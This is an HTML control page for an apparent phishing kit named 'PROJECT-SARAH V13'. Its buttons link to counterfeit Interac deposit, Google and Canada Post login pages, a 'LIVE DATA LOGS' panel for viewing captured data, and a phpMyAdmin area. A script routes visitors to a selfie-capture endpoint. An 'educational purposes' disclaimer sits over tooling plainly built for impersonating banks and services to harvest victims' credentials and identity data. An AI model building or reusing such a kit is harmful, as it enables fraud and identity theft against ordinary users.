<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        /* Global styles */
        body {
            background-color: #000;
            color: #fff;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            text-align: center;
        }

        /* GIF styles */
        .gif-container {
            max-width: 100%;
            margin-top: 20px;
        }

        img {
            max-width: 100%; /* Make the image responsive */
        }

        /* Heading styles */
        .panel-heading {
            font-size: 24px;
            font-weight: bold;
            color: red;
            margin-top: 20px;
        }

        /* Button styles */
        .button-container {
            margin-top: 20px;
        }

        .button {
            display: block;
            width: 90%;
            max-width: 300px;
            padding: 15px;
            background-color: transparent;
            color: #FFD700;
            text-decoration: none;
            font-size: 18px;
            margin: 10px auto;
            border: 2px solid #333;
            border-radius: 5px;
            transition: background-color 0.3s, color 0.3s;
        }

        .button:hover {
            background-color: #333;
            color: #FFD700;
        }

        /* Disclaimer Display */
        .disclaimer-container {
            margin-top: 20px;
        }

        .disclaimer-text {
            font-size: 14px;
        }
    </style>
</head>
<body>
    <!-- GIF Display -->
    <div class="gif-container">
        <img src="https://media.tenor.com/va6DQD3PGWEAAAAC/symbolic-record-sr.gif" alt="Random GIF" />
    </div>

    <!-- Heading -->
    <div class="panel-heading">
        PROJECT-SARAH V13
    </div>
    <!-- Disclaimer Display -->
    <div class="disclaimer-container">
        <p class="disclaimer-text">
            This is Developed Strictly For Educational Purposes.<br>
            Any Malicious use or intent, the developer <br> will not be held accountable by Canadian law.
        </p>
    </div>
    <!-- Buttons for Portals -->
    <div class="button-container">
        <a class="button" href="/admin/template/Deposit/depositt.php">INTERAC REBUILT</a>
        <a class="button" href="/maps/Google/loogin.php">GOOGLE MAPS RUBIX</a>
        <a class="button" href="/canada-post/login.php">CANADA POST CUSTOM</a>
        <a class="button" href="/admin/panel/login.php">LIVE DATA LOGS</a>
        <a class="button" href="/admin/phpmyadmin/index.php">DEVELOPER ONLY ZONE</a>
    </div>


    
    <script>
        function showButtons() {
            // Display the button container
            var buttonContainer = document.querySelector('.button-container');
            if (buttonContainer) {
                buttonContainer.style.display = 'block';
            }

            // Hide the disclaimer
            var disclaimerContainer = document.querySelector('.disclaimer-container');
            if (disclaimerContainer) {
                disclaimerContainer.style.display = 'none';
            }
        }

        function showError() {
            // Display an error message (you can customize this)
            alert('An error occurred.');

            // Hide the disclaimer
            var disclaimerContainer = document.querySelector('.disclaimer-container');
            if (disclaimerContainer) {
                disclaimerContainer.style.display = 'none';
            }
        }

        function startSelfieCapture() {
            // Redirect to the Node.js server route that initiates the selfie capture
            window.location.href = "/capture-selfie";
        }
    </script>
    <footer>
        <p>Developed by RandomRyan</p>
    </footer>
</body>
</html>

